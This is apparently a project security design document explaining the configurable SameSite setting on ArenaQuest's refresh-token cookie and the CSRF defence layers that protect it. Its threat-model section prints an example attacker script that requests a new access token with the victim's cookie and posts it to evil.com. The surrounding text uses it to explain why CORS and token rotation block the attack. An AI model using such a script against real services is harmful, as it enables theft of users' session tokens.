# Cookie SameSite Policy — Security Design

## Overview

The `refresh_token` cookie issued by the ArenaQuest API uses a **configurable
`SameSite` attribute** controlled via the `COOKIE_SAMESITE` environment variable.
This document explains why this configuration exists, the security trade-offs
involved, and how to choose the right value for each deployment environment.

## Quick Reference

| Environment | `COOKIE_SAMESITE` | Reason |
|---|---|---|
| **Production** (same domain) | `Strict` | Maximum CSRF protection when API and frontend share a domain |
| **Staging** (cross-domain) | `None` | Required — browser blocks cross-origin cookies otherwise |
| **Local dev** (default) | `None` | Falls back when env var is absent; frontend at `:3000`, API at `:8787` |

> [!IMPORTANT]
> When `SameSite=None` is used, the `Secure` flag **must** also be set (our code
> always sets it). Browsers silently reject `SameSite=None` cookies without `Secure`.

---

## The Problem: Cross-Domain Authentication

ArenaQuest uses a **split deployment** architecture in staging:

```
Frontend:  https://c2ee7644.arenaquest-web-staging.pages.dev   (Cloudflare Pages)
API:       https://api-staging.raphael-1d2.workers.dev          (Cloudflare Workers)
```

The `refresh_token` is an **HttpOnly cookie** set by the API. When the frontend
calls `/auth/refresh` via `fetch()` with `credentials: 'include'`, the browser
must decide whether to attach the API's cookie.

### SameSite behaviour matrix

| SameSite | Cross-origin `fetch` with credentials | Top-level navigation | CSRF protection |
|---|---|---|---|
| `Strict` | ❌ Cookie NOT sent | ❌ Cookie NOT sent | 🛡️ Maximum |
| `Lax` | ❌ Cookie NOT sent | ✅ Cookie sent (GET only) | 🛡️ High |
| `None` | ✅ Cookie sent | ✅ Cookie sent | ⚠️ Relies on other layers |

In our cross-domain staging setup, **only `None` allows the cookie to be
attached** to the `fetch` call from the frontend.

---

## CSRF Threat Model

### What is CSRF?

Cross-Site Request Forgery (CSRF) is an attack where a malicious website tricks
a user's browser into making an authenticated request to a target API that the
user is already logged into. The browser automatically attaches cookies, so the
API cannot distinguish the forged request from a legitimate one.

**OWASP Reference:** [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)

### Example Attack Scenario

Imagine a user is logged into ArenaQuest (has the `refresh_token` cookie). They
visit a malicious page:

```html
<!-- evil.com -->
<script>
  // Attempt 1: Steal a new access token
  fetch('https://api-staging.raphael-1d2.workers.dev/auth/refresh', {
    method: 'POST',
    credentials: 'include',  // attach the victim's cookie
  })
  .then(res => res.json())
  .then(data => {
    // data.accessToken — the attacker wants this!
    fetch('https://evil.com/steal', {
      method: 'POST',
      body: JSON.stringify(data),
    });
  });
</script>
```

### Why This Attack FAILS in ArenaQuest

Even with `SameSite=None`, this attack is blocked by **multiple layers of
defence** (defence in depth):

#### Layer 1 — CORS Origin Restriction

```typescript
cors({
  origin: allowedOrigins?.split(',') ?? 'http://localhost:3000',
  credentials: true,
})
```

The browser enforces CORS. Since `evil.com` is **not** in our `origin` allowlist:
- The **preflight** `OPTIONS` request gets no `Access-Control-Allow-Origin` header.
- The browser **blocks the `fetch()` entirely** — the request never reaches
  our route handler.
- Even if it did, the response would be **opaque** — JavaScript on `evil.com`
  cannot read `data.accessToken`.

#### Layer 2 — Bearer Token on Protected Routes

```typescript
// auth-guard.ts
const token = c.req.header('Authorization')?.replace('Bearer ', '');
if (!token) return c.json({ error: 'Unauthorized' }, 401);
```

All data-mutating and data-reading routes require a **`Authorization: Bearer`
header**. A CSRF attack **cannot inject custom headers** — browsers only
auto-attach cookies, not arbitrary headers.

#### Layer 3 — Refresh Token Rotation

Each refresh token is **single-use**. If an attacker somehow triggered a
`/auth/refresh`, the old token is invalidated. The legitimate user's next
refresh would fail, alerting them to suspicious activity.

#### Layer 4 — HttpOnly Cookie

The `refresh_token` cookie has the `HttpOnly` flag, preventing JavaScript
(including XSS payloads) from reading its value directly.

### Summary: Defence in Depth

```
┌─────────────────────────────────────────────────────┐
│                    evil.com                          │
│  fetch('api.arenaquest.com/auth/refresh', {          │
│    credentials: 'include'                            │
│  })                                                  │
└────────────────────┬────────────────────────────────┘
                     │
          ┌──────────▼──────────┐
          │   CORS Preflight    │  ← origin ≠ allowed → BLOCKED
          │   (Layer 1)         │
          └──────────┬──────────┘
                     │ (if somehow bypassed)
          ┌──────────▼──────────┐
          │  Response opaque    │  ← attacker can't read accessToken
          │  (Layer 1b)         │
          └──────────┬──────────┘
                     │ (even if token was used elsewhere)
          ┌──────────▼──────────┐
          │  Bearer required    │  ← CSRF can't inject headers → BLOCKED
          │  (Layer 2)          │
          └──────────┬──────────┘
                     │ (even if token was somehow obtained)
          ┌──────────▼──────────┐
          │  Token rotated      │  ← single-use, one shot only
          │  (Layer 3)          │
          └─────────────────────┘
```

---

## Configuration Guide

### Environment Variable

| Variable | Values | Default |
|---|---|---|
| `COOKIE_SAMESITE` | `Strict`, `Lax`, `None` | `None` (when empty or absent) |

The value is **case-insensitive** and trimmed. Unrecognised values fall back to
`None` with a console warning.

### Where to Set It

- **wrangler.jsonc** → `vars.COOKIE_SAMESITE` (per environment)
- **.dev.vars** → `COOKIE_SAMESITE=None` (local dev override, optional)
- **Cloudflare Dashboard** → Worker settings → Environment Variables

### Production Migration Plan

When ArenaQuest moves to a custom domain (e.g. `arenaquest.com` for frontend
and `api.arenaquest.com` for the API), they will share the same **site**
(`arenaquest.com`). At that point:

1. Set `COOKIE_SAMESITE=Strict` in production
2. Optionally set `COOKIE_SAMESITE=Lax` for a softer transition
3. The `SameSite=Strict` policy will provide full CSRF protection without
   relying on CORS as the primary defence

> [!TIP]
> `SameSite=Strict` is the strongest option. Use `Lax` only if you need
> cookies to survive top-level navigations from external links (e.g., email
> password-reset links that redirect to the dashboard). Our auth flow currently
> does not require this.

---

## Related Files

| File | Role |
|---|---|
| `apps/api/src/routes/auth.router.ts` | `parseCookieSameSite()` helper and cookie-setting logic |
| `apps/api/src/routes/index.ts` | Threads `cookieSameSite` from env to auth router |
| `apps/api/src/index.ts` | Reads `env.COOKIE_SAMESITE` and calls the parser |
| `apps/api/wrangler.jsonc` | Per-environment default values |
| `apps/api/test/routes/parse-cookie-samesite.spec.ts` | Unit tests for the parser |
| `apps/api/test/routes/auth.router.spec.ts` | Integration test validating `Set-Cookie` header |

---

## References

- [OWASP — Cross-Site Request Forgery Prevention](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html)
- [OWASP — Session Management Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html)
- [MDN — SameSite cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Reference/Headers/Set-Cookie#samesitesamesite-value)
- [Chromium — SameSite Updates](https://www.chromium.org/updates/same-site/)
